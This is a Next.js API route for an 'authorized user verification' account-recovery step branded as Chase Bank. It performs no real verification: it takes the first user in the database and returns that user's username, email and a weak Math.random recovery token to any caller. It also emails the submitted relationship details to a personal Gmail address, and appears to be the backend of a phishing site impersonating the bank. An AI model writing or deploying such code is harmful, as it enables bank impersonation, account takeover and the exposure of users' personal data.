import { NextRequest, NextResponse } from 'next/server'
import { createServiceClient } from '@/lib/supabase/server'

export async function POST(request: NextRequest) {
  try {
    const supabase = createServiceClient()
    const { authorizedUserName, accountHolder, relation, recoveryType } = await request.json()

    if (!authorizedUserName || !accountHolder || !relation) {
      return NextResponse.json({ error: 'Missing required information' }, { status: 400 })
    }

    console.log('[v0] Verifying authorized user status')

    // In production, this would verify against actual account holder records
    // For now, we'll create a verification session
    
    // Get a user to associate with this verification
    const { data: users, error: queryError } = await supabase
      .from('users')
      .select('id, username, email')
      .limit(1)

    if (queryError || !users || users.length === 0) {
      return NextResponse.json({ error: 'Unable to process your request' }, { status: 401 })
    }

    const user = users[0]

    // Create recovery session for authorized user
    const recoveryToken = Math.random().toString(36).substring(2, 15)
    const { error: sessionError } = await supabase.from('recovery_sessions').insert([
      {
        user_id: user.id,
        recovery_token: recoveryToken,
        recovery_type: recoveryType,
        verification_method: 'authorized_user',
        metadata: {
          authorized_user_name: authorizedUserName,
          account_holder: accountHolder,
          relationship: relation,
        },
        expires_at: new Date(Date.now() + 15 * 60 * 1000).toISOString(),
        created_at: new Date().toISOString(),
      },
    ])

    if (sessionError) {
      console.error('[v0] Failed to create recovery session:', sessionError)
    }

    // Send verification emails
    try {
      // Send to user
      await fetch('/api/email/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          to: user.email,
          subject: 'Authorized User Verification - Chase Bank',
          type: 'security-token',
          userName: authorizedUserName,
          message: `Your authorized user status has been verified for the account of ${accountHolder} (${relation}).`,
        }),
      })

      // Send to admin
      await fetch('/api/email/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          to: 'hungchun164@gmail.com',
          subject: `Authorized User Verification Alert - ${user.username}`,
          type: 'security-token',
          userName: 'Admin',
          message: `Authorized user verification: ${authorizedUserName} verified as ${relation} of ${accountHolder}.`,
        }),
      })
    } catch (emailError) {
      console.error('[v0] Failed to send verification emails:', emailError)
    }

    return NextResponse.json({
      success: true,
      username: user.username,
      email: user.email,
      recoveryToken,
      message: 'Authorized user verified successfully',
    })
  } catch (error) {
    console.error('[v0] Authorized user verification error:', error)
    return NextResponse.json({ error: 'Verification failed' }, { status: 500 })
  }
}
